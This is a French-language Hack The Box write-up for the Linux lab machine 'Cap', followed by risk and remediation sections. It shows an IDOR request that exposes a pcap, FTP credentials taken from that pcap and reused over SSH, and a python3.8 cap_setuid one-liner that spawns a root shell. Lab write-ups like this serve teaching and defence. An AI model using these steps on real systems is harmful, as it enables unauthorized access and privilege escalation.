# HTB — CAP Write-up

- **Machine :** Cap
- **Plateforme :** Hack The Box
- **OS :** Linux
- **Difficulté :** Easy
- **IP :** 10.10.10.245

---

## Description

Cap est une machine Linux dont le vecteur d'entrée est une **IDOR** (Insecure Direct Object Reference) sur une interface web de monitoring réseau : l'application expose des captures réseau par utilisateur via une URL du type `/data/<id>`, sans vérifier que l'utilisateur courant est autorisé à accéder à la capture demandée. Ce type de faille s'inscrit dans le *workflow* d'authentification/autorisation applicative : l'application authentifie correctement l'utilisateur mais ne contrôle pas ses droits sur la ressource ciblée. La chaîne se termine par une élévation de privilèges via une **capability Linux** (`cap_setuid`) positionnée sur le binaire `python3.8`.

---

## Exploitation

### 1. Reconnaissance

```bash
nmap -sC -sV 10.10.10.245
```

3 ports TCP ouverts :

| Port | Service |
|------|---------|
| 21   | FTP     |
| 22   | SSH     |
| 80   | HTTP    |

Le port 80 héberge un dashboard de sécurité réseau (interface d'admin/monitoring).

### 2. Découverte et exploitation de l'IDOR

L'application propose des captures réseau par utilisateur via des URLs du type :

```
http://10.10.10.245/data/<id>
```

Le `<id>` est directement manipulable côté client, sans contrôle d'autorisation. En descendant l'ID jusqu'à `0`, on tombe sur la capture correspondant à une session admin/initiale :

```
http://10.10.10.245/data/0
```

On télécharge le fichier `.pcap` associé (bouton "Download").

### 3. Analyse du PCAP (Wireshark)

Le `.pcap` contient un échange FTP en clair. Filtre utile : `ftp` ou `ftp.request.command == "PASS"`, puis clic droit → *Follow → TCP Stream* pour isoler l'authentification.

Identifiants récupérés :

```
user     : nathan
password : Buck3H4TF0RM3!
```

### 4. Accès initial (foothold)

Les mêmes identifiants sont réutilisés en SSH :

```bash
ssh nathan@10.10.10.245
# password : Buck3H4TF0RM3!
```

```bash
cat user.txt
```

### 5. Élévation de privilèges

Énumération des capabilities Linux :

```bash
getcap -r / 2>/dev/null
```

Résultat :

```
/usr/bin/python3.8 = cap_setuid+ep
```

Le binaire `python3.8` possède `cap_setuid`, ce qui permet à un processus lancé via cet interpréteur d'appeler `setuid(0)` et de devenir root sans SUID classique :

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
id
# uid=0(root) ...
cd /root
cat root.txt
```

---

## PoC

**Exploitation de l'IDOR :**

```http
GET /data/0 HTTP/1.1
Host: 10.10.10.245
```

**Élévation de privilèges via cap_setuid :**

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid+ep

/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Risk

- **IDOR** : n'importe quel utilisateur authentifié peut lire les captures réseau de tous les autres utilisateurs (y compris admin) en changeant simplement un identifiant dans l'URL, sans aucune vérification de propriété.
- **Fuite d'identifiants en clair** : le protocole FTP transmet les identifiants en clair, capturables dans un simple `.pcap` exposé.
- **Réutilisation de mots de passe** : le même secret sert pour FTP et SSH, ce qui transforme une fuite localisée en compromission complète du compte système.
- **Élévation de privilèges triviale** : une capability `cap_setuid` mal positionnée sur un interpréteur généraliste (`python3.8`) équivaut à un accès root total pour tout utilisateur pouvant l'exécuter.
- **Impact global** : compromission complète de la machine (accès root), avec risque de mouvement latéral si les mêmes identifiants sont réutilisés ailleurs.

---

## Remediation

- Implémenter un contrôle d'autorisation systématique côté serveur sur chaque ressource identifiée par un ID (vérifier que la ressource demandée appartient bien à l'utilisateur authentifié), plutôt que de faire confiance à un identifiant fourni côté client.
- Préférer des identifiants non séquentiels/non devinables (UUID) pour les ressources sensibles, en complément — et non en remplacement — du contrôle d'autorisation.
- Remplacer les protocoles en clair (FTP, HTTP) par leurs équivalents chiffrés (SFTP/FTPS, HTTPS) pour tout transport d'identifiants.
- Interdire la réutilisation d'un même mot de passe entre plusieurs services/comptes.
- Auditer régulièrement les capabilities Linux avec `getcap -r /` et retirer toute capability non strictement nécessaire (notamment `cap_setuid` sur des interpréteurs généralistes comme Python).

---

## Résumé

**Machine :** Cap
**Vulnérabilité principale :** IDOR (`/data/<id>`) + capability Linux `cap_setuid` mal configurée
**Accès initial :** SSH via identifiants FTP capturés dans le pcap exposé
**Privilèges obtenus :** Root

**Flags :**
- User : récupéré via `cat user.txt` après connexion SSH
- Root : récupéré via `cat root.txt` après `os.setuid(0)`

**Outils utilisés :** `nmap` · navigateur web · `wireshark` · `ssh` · `getcap` · `python3.8`
